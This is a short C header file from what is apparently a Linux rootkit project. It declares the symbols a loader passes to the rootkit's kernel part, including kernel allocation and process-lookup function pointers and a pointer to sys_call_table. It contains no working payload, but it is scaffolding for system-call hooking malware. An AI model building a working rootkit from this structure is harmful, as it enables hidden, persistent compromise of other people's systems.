/*
 * Here the shared functions and variables between loader and rootkit's kernel.
 */

#ifndef SHARED_KERNEL_H

/*
 * Rootkit's kernel functions.
 */
extern int pinfo(const char *fmt, ...);
extern int perr(const char *fmt, ...);
extern void kernel_test(void);

/*
 * Symbols obtained from loader, passed to rootkit's kernel.
 */
extern void * (*f_kmalloc)(size_t size, gfp_t flags);
extern void (*f_kfree)(const void *);
extern struct pid * (*f_find_vpid)(pid_t nr);
extern int (*f_vscnprintf)(char *buf, size_t size, const char *fmt, va_list args);
extern int (*f_sys_write)(int fd, const char *mem, size_t len);

extern void **sys_call_table;

/*
 * Labels.
 */
extern void kernel_start(void);
extern void kernel_end(void);

#define SHARED_KERNEL_H

#endif
